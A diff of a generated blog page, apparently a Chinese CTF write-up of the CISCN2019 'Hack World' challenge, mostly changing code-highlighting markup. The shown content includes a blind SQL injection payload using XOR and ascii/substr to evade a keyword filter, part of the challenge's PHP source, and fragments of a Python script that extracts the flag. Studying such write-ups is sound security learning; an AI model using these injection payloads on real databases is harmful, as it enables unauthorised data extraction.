@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -247,7 +255,7 @@
             <div class="markdown-body">
               <h2 id="二十、"><a href="#二十、" class="headerlink" title="二十、"></a>二十、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[CISCN2019 华北赛区 Day2 Web1]Hack World<img src="https://ftp.bmp.ovh/imgs/2021/02/89cf401b467058ca.png" srcset="/img/loading.gif">       </p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>输入与回显      </p>
-<div class="hljs"><pre><code>0         
+<pre><code>0         
 Error Occured When Fetch Result.           
 1           
 Hello, glzjin wants a girlfriend.           
@@ -256,10 +264,10 @@ Do you want to be my girlfriend?
 3     
 Error Occured When Fetch Result.  
 1&#39; or 1=1#     
-SQL Injection Checked.      </code></pre></div>
+SQL Injection Checked.      </code></pre>
 <p>应该是有过滤的，burp看看<img src="https://ftp.bmp.ovh/imgs/2021/02/3880c49a96ccc108.png" srcset="/img/loading.gif"><br>482的都被过滤了<br><code>union、select、空格、#、+、-。。。。。  </code><br>同时也可以看到ascii和substr没有被过，<br>输入2/2可以判断是数字型<br>空格可以用<code>()</code>绕过<br>或者异或<code>1^</code><br>payload:<code>1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</code> </p>
 <p>别人wp里看到的题目源码         </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 $dbuser=<span class="hljs-string">&#x27;root&#x27;</span>;
 $dbpass=<span class="hljs-string">&#x27;root&#x27;</span>;
 
@@ -300,8 +308,8 @@ mysql_select_db(<span class="hljs-string">&quot;ctf&quot;</span>,$db);
     &#125;
 &#125;<span class="hljs-keyword">else</span>&#123;
     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;SQL Injection Checked.&quot;</span>);
-&#125;</code></pre></div></code></pre>
-<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><div class="hljs"><pre><code><pre><code class="hljs php">import requests
+&#125;</code></pre></code></pre>
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><pre><code><pre><code class="hljs php">import requests
 import base64
 import sys
 import <span class="hljs-keyword">string</span>
@@ -326,7 +334,7 @@ payload=&#123;
 			<span class="hljs-keyword">print</span>(flag)
 			<span class="hljs-keyword">break</span>
 			
-<span class="hljs-keyword">print</span>(flag)</code></pre></div></code></pre>
+<span class="hljs-keyword">print</span>(flag)</code></pre></code></pre>
 <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>空格绕过</strong>    </p>
 <ol>
 <li>用括号将任何可以计算结果的语句括起来        </li>
@@ -478,6 +486,8 @@ payload=&#123;
 
 
 
+  
+    
   
 
 
